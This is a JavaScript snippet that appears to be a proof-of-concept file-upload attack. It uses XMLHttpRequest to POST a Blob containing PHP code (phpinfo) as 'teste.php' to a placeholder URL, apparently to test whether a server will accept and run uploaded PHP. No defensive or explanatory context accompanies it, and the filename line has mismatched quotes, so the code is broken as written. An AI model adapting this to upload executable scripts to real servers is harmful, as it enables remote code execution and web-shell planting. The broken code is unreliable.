var data;

function read_body(xhr){ 
  if (!xhr.responseType || xhr.responseType === 'text'){ 
      data = xhr.responseText; 
     } else if (xhr.responseType === 'document'){ 
       data = xhr.responseXML; 
     } else if (xhr.responseType === 'json'){ 
       data = xhr.responseJSON; 
     } else{ 
       data = xhr.response; 
     }
      return data;
}
 
var xhr = new XMLHttpRequest(); 

xhr.onreadystatechange = function(){  
  if (xhr.readyState == XMLHttpRequest.DONE){ 
     console.log(read_body(xhr)); 
  } 
} 
 
var fd = new FormData(); 
var content = '<?php phpinfo(); ?>'; 
var blob = new Blob([content], { type: 'application/x-php'}); 
fd.append('userfile', blob, "'teste.php'); 
fd.append('url', 'Adicionar url'); 
console.log(fd);  
 
xhr.open('POST', 'Adicionar url', true); 
    
xhr.send(fd);
